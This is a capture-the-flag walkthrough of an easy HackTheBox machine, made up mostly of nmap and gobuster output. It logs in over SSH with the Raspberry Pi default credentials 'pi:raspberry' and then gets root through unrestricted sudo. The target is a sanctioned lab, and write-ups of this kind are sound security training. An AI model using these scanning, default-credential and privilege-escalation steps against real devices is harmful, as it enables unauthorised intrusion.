### Miraj HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.48

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.10.48 -p22,53,80,1493,32400,32469                                                                                                                                                           
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 07:27 WAT                                                                                                                                                    
Nmap scan report for 10.10.10.48                                                                                                                                                                                   
Host is up (0.36s latency).                                                                                                                                                                                        
                                                                                                                                                                                                                   
PORT      STATE SERVICE VERSION                                                                                                                                                                                    
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                     
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)                                                                                                                                                     
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)                                                                                                                                                     
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)                                                                                                                                                    
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)                                                                                                                                                  
53/tcp    open  domain  dnsmasq 2.76                                                                                                                                                                               
| dns-nsid:                                                                                                                                                                                                        
|_  bind.version: dnsmasq-2.76                                                                                                                                                                                     
80/tcp    open  http    lighttpd 1.4.35                                                                                                                                                                            
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                                                                                                                                
|_http-server-header: lighttpd/1.4.35                                                                                                                                                                              
1493/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)                                                                                                                                             
32400/tcp open  http    Plex Media Server httpd                                                                                                                                                                    
|_http-favicon: Plex                                                                                                                                                                                               
| http-auth:                                                                                                                                                                                                       
| HTTP/1.1 401 Unauthorized\x0D                                                                                                                                                                                    
|_  Server returned status 401 but no WWW-Authenticate header.                                                                                                                                                     
|_http-title: Unauthorized                                                                                                                                                                                         
|_http-cors: HEAD GET POST PUT DELETE OPTIONS                                                                                                                                                                      
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)                                                                                                                                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.76 seconds
```

Heading over to port 80 shows a blank page
![image](https://user-images.githubusercontent.com/113513376/216251864-6fed27c1-a5cc-41d9-940c-50225bf1438e.png)

I'll brute force directory

```
└─$ gobuster dir -u http://10.10.10.48/ -w /usr/share/wordlists/dirb/common.txt      
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.48/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/02 07:47:44 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48/admin/]
/swfobject.js         (Status: 200) [Size: 61]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/02 07:50:29 Finished
===============================================================
```

The admin directory looks interesting

On navigating to that directory, I got `Pi-Hole Admin Console`

Searching for default cred gives this `pi:raspberry`

Trying to login with that doesn't work
![image](https://user-images.githubusercontent.com/113513376/216254277-4ea1f3b3-2b63-4a22-add9-1e0de6e1294e.png)

But on trying it on ssh works 

```
└─$ ssh pi@10.10.10.48
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ED25519) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~$ 
```

Now lets escalate priv

Checking sudo perm shows we can run all as root

```
pi@raspberrypi:~$ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~$
```

So lets get root 

```
pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi# cd /root
root@raspberrypi:~# ls -al
total 22
drwx------  3 root root 4096 Aug 27  2017 .
drwxr-xr-x 35 root root 4096 Aug 14  2017 ..
-rw-------  1 root root  549 Dec 24  2017 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   76 Aug 14  2017 root.txt
drwx------  2 root root 4096 Aug 27  2017 .ssh
root@raspberrypi:~#
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
